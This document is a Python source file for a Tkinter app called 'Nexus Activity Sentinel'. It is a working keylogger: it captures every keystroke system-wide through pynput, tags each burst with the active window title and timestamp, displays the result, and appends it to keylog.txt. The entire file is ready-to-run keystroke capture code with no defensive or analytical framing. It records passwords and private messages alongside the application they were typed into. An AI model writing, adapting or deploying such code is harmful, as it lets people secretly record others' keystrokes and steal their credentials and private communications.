import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
from threading import Thread
import pygetwindow as gw
import time
from datetime import datetime

# Configuration
LOG_FILE = "keylog.txt"


class ModernMonitor:
    def __init__(self, root):
        self.root = root
        self.root.title("Nexus Activity Sentinel")
        self.root.geometry("800x600")
        self.root.configure(bg="#1e1e1e")  # Dark background

        self.last_window = ""

        # --- Sidebar / Header ---
        self.header = tk.Frame(root, bg="#2d2d2d", height=60)
        self.header.pack(fill=tk.X)

        self.title_label = tk.Label(
            self.header,
            text="SYSTEM ACTIVITY LOG",
            fg="#00ff41",  # Matrix green
            bg="#2d2d2d",
            font=("Consolas", 16, "bold")
        )
        self.title_label.pack(side=tk.LEFT, padx=20, pady=15)

        self.status_label = tk.Label(
            self.header,
            text="● LIVE",
            fg="#ff4444",
            bg="#2d2d2d",
            font=("Arial", 10, "bold")
        )
        self.status_label.pack(side=tk.RIGHT, padx=20)

        # --- Main Log Area ---
        self.text_frame = tk.Frame(root, bg="#1e1e1e")
        self.text_frame.pack(expand=True, fill=tk.BOTH, padx=15, pady=15)

        self.text_area = tk.Text(
            self.text_frame,
            wrap='word',
            height=25,
            width=90,
            font=("Consolas", 11),
            bg="#0f0f0f",  # Deeper black
            fg="#cccccc",  # Light grey text
            insertbackground="white",  # Cursor color
            padx=10,
            pady=10,
            borderwidth=0
        )
        self.text_area.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)

        # Custom Scrollbar
        self.scrollbar = tk.Scrollbar(self.text_frame, command=self.text_area.yview)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.text_area.config(yscrollcommand=self.scrollbar.set)

        # --- Bottom Control Bar ---
        self.footer = tk.Frame(root, bg="#2d2d2d", height=50)
        self.footer.pack(fill=tk.X, side=tk.BOTTOM)

        self.clear_btn = tk.Button(
            self.footer,
            text="PURGE LOGS",
            command=self.clear_log,
            bg="#cc0000",
            fg="white",
            font=("Arial", 9, "bold"),
            relief=tk.FLAT,
            padx=20,
            pady=5,
            activebackground="#ff0000"
        )
        self.clear_btn.pack(pady=10)

        # Start Workers
        self.start_threads()

    def get_active_window(self):
        try:
            window = gw.getActiveWindow()
            return window.title if window else "Desktop"
        except:
            return "System"

    def log_to_gui(self, message, is_header=False):
        """Thread-safe update with optional styling for headers."""
        self.text_area.insert(tk.END, message)

        # Apply a 'header' tag to window titles for color coding
        if is_header:
            start_index = self.text_area.index("end-2c linestart")
            self.text_area.tag_add("header", start_index, "end-1c")
            self.text_area.tag_config("header", foreground="#00ff41", font=("Consolas", 11, "bold"))

        self.text_area.see(tk.END)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(message)

    def window_monitor_loop(self):
        """Checks window title every 1 second."""
        while True:
            current_window = self.get_active_window()
            if current_window != self.last_window:
                timestamp = datetime.now().strftime('%H:%M:%S')
                header = f"\n\n[ {timestamp} ] WINDOW: {current_window}\n" + ("=" * 60) + "\n"
                self.root.after(0, self.log_to_gui, header, True)
                self.last_window = current_window
            time.sleep(1)

    def on_press(self, key):
        """Real-time key capture."""
        try:
            char = key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: " [⌫] ",
                keyboard.Key.tab: " [TAB] "
            }
            char = special_keys.get(key, f" [{key}] ")

        self.root.after(0, self.log_to_gui, char)

    def clear_log(self):
        if messagebox.askyesno("Confirm Purge", "Permanently delete all activity logs?"):
            open(LOG_FILE, "w").close()
            self.text_area.delete(1.0, tk.END)
            self.log_to_gui("--- LOGS PURGED ---\n", True)

    def start_threads(self):
        Thread(target=self.window_monitor_loop, daemon=True).start()

        def listen():
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()

        Thread(target=listen, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = ModernMonitor(root)
    root.mainloop()